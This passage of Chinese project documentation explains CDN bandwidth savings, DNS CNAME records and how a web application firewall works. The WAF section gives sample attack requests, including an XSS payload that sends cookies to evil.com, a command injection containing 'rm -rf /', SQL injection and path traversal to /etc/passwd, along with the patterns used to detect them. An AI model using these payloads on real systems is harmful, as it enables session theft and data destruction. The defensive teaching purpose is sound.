| 上 CDN(回源 10%) | CDN:600 × 0.24 = 144 元 + ECS:60 × 0.8 = 48 元 = **192 元** | 性价比最高 |

**结论**:流量稍大的项目,**云主机 + CDN 混合方案最划算**——CDN 扛大部分流量,云主机只回源 10%,带宽买小的就够。

## Cloudflare 为什么"不限带宽"?

Cloudflare 的定价策略:**不限带宽,只限请求数和 CPU 时间**。

| 项 | 免费版限制 |
|---|----------|
| 带宽 | **不限** |
| 请求数 | 无限(Pages)、10 万/天(Worker) |
| Worker CPU 时间 | 10 ms/请求 |
| R2 存储 | 10 GB |

## 带宽优化:省钱的几个技巧

### 1. 启用 Gzip / Brotli 压缩

```
未压缩:dist/index.js  500 KB
Gzip:                 150 KB(省 70%)
Brotli:               120 KB(省 76%)
```

```nginx
gzip_types text/css application/javascript application/json image/svg+xml;

```

**直接效果**:带宽费用打 3 折。

### 2. 静态资源长缓存(减少回源)

`Cache-Control: max-age=31536000, immutable` 让用户一年内不再请求同一资源。第二次访问**零带宽消耗**。

### 3. 文件名带 hash(便于长缓存)

Vite/Webpack 自动给文件名加 hash:`index-3a7f9b.js`。文件变了 hash 变,新文件新 URL,可以放心长缓存。

### 4. 用 CDN 扛流量(分摊源站压力)

CDN 流量单价 0.2-0.3 元/GB,比云主机带宽(0.8 元/GB 或按 Mbps)便宜很多。CDN 缓存命中率 90% 的话,源站带宽消耗降 10 倍。

### 5. 图片用 WebP / AVIF

```
logo.png  500 KB
logo.webp 150 KB(省 70%)
logo.avif 80 KB (省 84%)
```

### 6. 代码分割(Code Splitting)

`import('./AdminPanel')` 懒加载,首屏只加载必要的 JS,大页面按需加载。首屏带宽降一半。

### 7. 用对象存储代替云主机托管静态资源

云主机:0.8 元/GB 流量 + 带宽峰值限制
对象存储:0.12 元/GB 流量 + 无峰值限制 + 自带 CDN 加速

**纯静态资源放云主机就是浪费钱**,应该放 OSS/R2/S3。

# CNAME 是什么?

## 一句话回答

**CNAME(Canonical Name Record)是 DNS 的一种记录类型,把一个域名"别名"指向另一个域名**,而不是直接指向 IP。

## CNAME 和 A 记录的区别

DNS 记录里最常用的两种:

| 记录类型 | 指向 | 例子 |
|---------|------|------|
| **A 记录** | 域名 → IP 地址 | `app.example.com → 104.21.56.89` |
| **CNAME 记录** | 域名 → 另一个域名 | `cdn.example.com → cdn.cloudflare.net` |

**类比**:
- **A 记录** = 直接告诉别人"我家在XX路XX号"(给具体地址)
- **CNAME** = 告诉别人"我家地址去问物业"(指向另一个域名,由那个域名再给 IP)

## 为什么需要 CNAME?

### 场景 1:CDN 接入(本项目主用)

CDN 厂商会给你一个专属域名,如 `fe-depoly.cdn.cloudflare.net`,你把自己的域名 CNAME 过去:

```
app.example.com  CNAME  fe-depoly.cdn.cloudflare.net
```

这样 `app.example.com` 的解析权**交给 Cloudflare 的智能 DNS**,Cloudflare 根据用户位置返回最近的边缘节点 IP。

**为什么不直接 A 记录指向某个 IP**?因为 CDN 边缘节点 IP 会变(节点扩容、故障切换、动态调度),如果直接 A 记录,你就要手动更新 IP。CNAME 让 CDN 厂商自己管 IP,你只管"指向它"。

### 场景 2:第三方服务集成

| 服务 | 你设置的 CNAME | 指向 |
|------|--------------|------|
| GitHub Pages | `www.example.com → user.github.io` | GitHub 服务器 |
| Vercel | `app.example.com → cname.vercel-dns.com` | Vercel 边缘 |
| 邮件服务 | `mail.example.com → mx.qiye.aliyun.com` | 阿里云企业邮 |
| 视频直播 | `live.example.com → example.com.cdn.dnsv1.com` | 腾讯云直播 CDN |
| 验证域名 | `_acme.example.com → xxx.acme-validation.com` | SSL 证书签发验证 |

**好处**:第三方服务的 IP 随时可能变,你不用跟进,只要 CNAME 指过去,他们自己管 IP 调度。

### 场景 3:环境切换 / 灰度

```
# 生产环境
app.example.com  CNAME  prod-fe.example.com

# 灰度环境
app-gray.example.com  CNAME  gray-fe.example.com

# 切流量时只需改 CNAME 指向,不用动 A 记录
```

CNAME 切换比 A 记录灵活,适合多环境管理。

## CNAME 的工作流程

以本项目为例,用户访问 `app.example.com`:

```
1. 浏览器查询 app.example.com 的 DNS
            │
            ▼
2. Cloudflare 权威 DNS 返回:
   "app.example.com 是 CNAME,指向 fe-depoly-edge.workers.dev"
            │
            ▼
3. 继续查询 fe-depoly-edge.workers.dev
            │
            ▼
4. Cloudflare DNS 返回 IP:104.21.56.89(智能选择最近边缘节点)
            │
            ▼
5. 浏览器连接 104.21.56.89,Host: app.example.com
```

**关键**:CNAME 解析会**多一步跳转**,理论上有几毫秒额外延迟,但现代 DNS 解析器会缓存中间结果,实际几乎无感。

## CNAME 的限制

### 限制 1:不能给顶级域名(apex domain)设 CNAME

**RFC 1034 规定**:顶级域名(如 `example.com` 本身,不含子域名)不能设 CNAME,只能设 A / AAAA 记录。

| 域名类型 | 例子 | 能否 CNAME |
|---------|------|----------|
| 顶级域名(apex) | `example.com` | ❌ RFC 不允许 |
| 二级子域名 | `www.example.com` | ✅ 可以 |
| 三级子域名 | `app.sub.example.com` | ✅ 可以 |

**问题**:CDN 厂商要求你 CNAME 接入,但你想让 `example.com`(不带 www)也能用,怎么办?

**解决方案**:
- **方案 A**:Cloudflare 的 **CNAME Flattening**(CNAME 扁平化),把 CNAME 在 DNS 层"展开"成 A 记录返回,对客户端透明
- **方案 B**:用 ALIAS 记录(部分 DNS 服务商支持,如 DNSPod)
- **方案 C**:用 ANAME 记录(类似 ALIAS,叫法不同)

**Cloudflare 默认开启 CNAME Flattening**,所以 `example.com` 也能"伪 CNAME"指向 CDN,这是 Cloudflare 的便利之一。

### 限制 2:CNAME 链不能太长

CNAME 可以套娃:`a.com CNAME b.com CNAME c.com`,但每跳都有延迟,且 DNS 解析器对 CNAME 链长度有限制(通常 5-10 跳),超了会解析失败。

### 限制 3:CNAME 和其他记录冲突

如果 `app.example.com` 已经设了 CNAME,就**不能再设其他记录**(MX、TXT、A 等)。CNAME 要求这个域名"完全交给"目标域名管理。

**例外**:Cloudflare 的 CNAME Flattening 模式下,允许同时存在 CNAME 和其他记录(因为它在 DNS 层做了转换)。

## 本项目里的 CNAME

本项目用的 CNAME 场景:

```
# Cloudflare 控制台里(假设 app.example.com 是自定义域名)
app.example.com  CNAME  fe-depoly-edge.workers.dev
```

但实际本项目用的是 **Worker 自定义域名模式**(`custom_domain = true`),Cloudflare 自动处理:
- DNS 记录显示为 **AAAA 记录**(指向 Cloudflare 的 Anycast IPv6)
- 请求路由到 Worker

**为什么不是 CNAME**?Worker 自定义域名走的是 Cloudflare 内部路由,直接用 AAAA + Anycast,比 CNAME 跳转更高效。如果用 Pages,才会是 CNAME 指向 `*.pages.dev`。

## CNAME 验证

设置完 CNAME 后,用 `dig` / `nslookup` / `host` 命令验证:

```bash
# dig 命令(macOS/Linux 自带)
dig app.example.com

# 输出 ANSWER SECTION:
# app.example.com.  300  IN  CNAME  fe-depoly-edge.workers.dev.
# fe-depoly-edge.workers.dev. 60 IN A 104.21.56.89
```

```bash
# nslookup(Windows / macOS)
nslookup app.example.com

# 输出:
# app.example.com  canonical name = fe-depoly-edge.workers.dev.
# Name:    fe-depoly-edge.workers.dev
# Address: 104.21.56.89
```

如果看到 `canonical name = ...` 说明 CNAME 设置成功。

## CNAME 小结

- **CNAME = 域名别名**,把一个域名指向另一个域名
- **主要用于 CDN / 第三方服务接入**,让服务商自己管 IP 调度
- **顶级域名不能 CNAME**,但 Cloudflare 的 CNAME Flattening 能绕过这个限制
- **本项目用 AAAA + Anycast 替代 CNAME**,Worker 自定义域名模式更高效
- **验证用 `dig` 命令**,看到 canonical name 即成功

# WAF 是什么?

## 一句话回答

**WAF(Web Application Firewall,Web 应用防火墙)是专门保护 Web 应用的安全层,在 HTTP 请求到达你的应用之前,先检查它是否包含恶意内容**(SQL 注入、XSS、爬虫等),有就拦截,没有才放行。

## WAF 和传统防火墙的区别

传统防火墙工作在**网络层**(L3/L4),只看 IP 和端口;WAF 工作在**应用层**(L7),能看懂 HTTP 请求内容。

| 维度 | 传统防火墙 | WAF |
|------|----------|-----|
| 工作层级 | L3/L4(网络层) | L7(应用层) |
| 看什么 | IP、端口、协议 | HTTP 头、Body、Cookie、URL |
| 防什么 | 端口扫描、DDoS、非法连接 | SQL 注入、XSS、CSRF、爬虫 |
| 类比 | 小区门卫(看身份证) | 安检仪(看包里装什么) |

**举例**:
- 传统防火墙:"这个 IP 能访问 80 端口吗?" → 能,放行
- WAF:"这个请求 URL 里带 `UNION SELECT * FROM users` 干嘛?" → 像 SQL 注入,拦截

## WAF 防什么?

### 1. SQL 注入(SQLi)

攻击者在输入框或 URL 里塞 SQL 代码,试图让数据库执行非授权操作。

```
正常请求:
GET /user?id=123

SQL 注入请求:
GET /user?id=123 UNION SELECT password FROM users--
```

WAF 识别 `UNION SELECT`、`--`、`OR 1=1` 等模式,直接拦截。

### 2. 跨站脚本攻击(XSS)

攻击者在页面里塞 JavaScript 代码,其他用户访问时执行,盗取 cookie 或会话。

```
正常请求:
GET /search?q=react

XSS 攻击请求:
GET /search?q=<script>document.location='https://evil.com/?c='+document.cookie</script>
```

WAF 识别 `<script>`、`onerror=`、`javascript:` 等,拦截。

### 3. 跨站请求伪造(CSRF)

诱导已登录用户在不知情的情况下发起请求(如转账)。

WAF 通过检查 `Referer`、`Origin`、CSRF Token 来识别。

### 4. 命令注入

```
GET /ping?host=8.8.8.8;rm -rf /
```

攻击者试图让服务器执行系统命令。WAF 识别 `;`、`|`、`rm -rf` 等模式。

### 5. 路径遍历(Path Traversal)

```
GET /file?name=../../etc/passwd
```

试图访问系统敏感文件。WAF 识别 `../`、`/etc/passwd`、`/windows/system32` 等。

### 6. 恶意爬虫 / Bot

- 搜索引擎爬虫(良性,要放行)
- 数据窃取爬虫(恶意,要拦截)
- 撞库机器人(批量试密码)

WAF 通过 User-Agent、请求频率、行为模式识别。

### 7. DDoS 应用层攻击

不是流量打满带宽(L3/L4 DDoS),而是消耗应用资源的请求(如频繁查询数据库)。

WAF 限流 + 人机校验(如 Cloudflare Turnstile / 阿里云滑块)。

### 8. 0day 漏洞防护

新漏洞爆出后,WAF 厂商快速更新规则,在应用打补丁前先拦住攻击。

## WAF 怎么工作?

```
用户请求 ──> WAF ──> 你的应用
              │
              ▼
          规则匹配引擎
              │
   ┌──────────┼──────────┐
   ▼          ▼          ▼
 匹配规则1  匹配规则2  匹配规则N
   │          │          │
   ▼          ▼          ▼
 放行/拦截  放行/拦截  放行/拦截
              │
              ▼
         综合决策(放行 / 拦截 / 验证码)
```

**规则类型**:
- **托管规则集**(Managed Ruleset):WAF 厂商维护的规则库(如 OWASP Core Rule Set)
- **自定义规则**(Custom Rule):你自己写的规则,针对业务特性
- **速率限制规则**(Rate Limiting):按 IP / URL 限流
- **Bot 管理**:识别爬虫,挑战或拦截

## WAF 的处置动作

当请求匹配规则,WAF 可以做不同处理:

| 动作 | 说明 | 适用 |
|------|------|------|
| **Block(拦截)** | 直接返回 403 | 确定的恶意请求 |
| **Challenge(挑战)** | 弹验证码 / JS Challenge | 可疑请求,让 Bot 过不了 |
| **Log(记录)** | 只记录不拦截 | 规则调试期,观察误判 |
| **Allow(放行)** | 主动放行 | 白名单 |
| **Rate Limit** | 超过阈值才拦截 | 防爬虫、防爆破 |

**生产建议**:新规则先 `Log` 跑几天,观察误判,再切 `Block`。

```
动作: Skip(其他 WAF 规则)
```

适合:让搜索引擎爬虫正常访问。

## WAF 和 CDN 的关系

CDN 厂商通常**自带 WAF**(Cloudflare、阿里云 CDN、Akamai 都是)。WAF 在 CDN 边缘节点上跑:

```
用户请求 ──> CDN 边缘节点
                │
                ▼
            WAF 检查(在边缘节点本地)
                │
                ▼
            缓存检查 / 回源
```

**好处**:
- 恶意请求在边缘被拦,**不会回源**,源站零压力
- WAF 规则统一在 CDN 配置,不用改应用代码
- 全球所有边缘节点同步规则,防护一致

**对比自建 WAF**(在云主机上跑 ModSecurity):
- 自建 WAF 要消耗源站 CPU,且单点防护
- CDN 集成 WAF 在边缘,无单点,不消耗源站资源

## WAF 的局限

WAF 不是银弹,有这些局限:

### 1. 误判(False Positive)

合法请求被误判为攻击,正常用户被拦。例如用户在评论里写代码示例,可能被识别为 XSS。

**解决**:规则先 `Log` 跑一段时间,排除误判再切 `Block`。

### 2. 漏判(False Negative)

新型攻击方式没匹配到规则,WAF 放行。

**解决**:WAF 规则集要持续更新,且配合应用层校验(参数化查询、输入验证)。

### 3. 加密流量盲区(传统 WAF)

如果流量是 HTTPS,且 WAF 不能解密,就看不到内容,只能看 IP/端口,等于没 WAF。

**解决**:Cloudflare / 阿里云 CDN 这种边缘 WAF 在 TLS 终止后检查,能看明文。

### 4. 不能替代应用层安全

WAF 是**最后一道防线**,不是唯一防线。应用本身要:
- 参数化查询(防 SQL 注入)
- 输出转义(防 XSS)
- CSRF Token
- 权限校验
- 输入验证

**正确的安全理念**:应用层做对 + WAF 兜底 = 纵深防御。

## WAF 小结

- **WAF = Web 应用防火墙**,在 HTTP 层检查恶意请求,保护 Web 应用
- **主要防 SQL 注入、XSS、CSRF、爬虫、DDoS、0day**
- **Cloudflare 免费版自带基础 WAF + DDoS 防护**,本项目默认就有
- **WAF 动作**:Block / Challenge / Log / Allow / Rate Limit
- **WAF 在 CDN 边缘节点跑**,恶意请求不回源,源站零压力
- **WAF 是兜底**,不能替代应用层安全,要纵深防御

理解 WAF 后,本项目就有一套完整的安全栈:Cloudflare DNS 防劫持 + CDN 边缘缓存 + WAF 防恶意请求 + Worker 鉴权 + R2 存静态资源,每一层都有对应的防护职责。
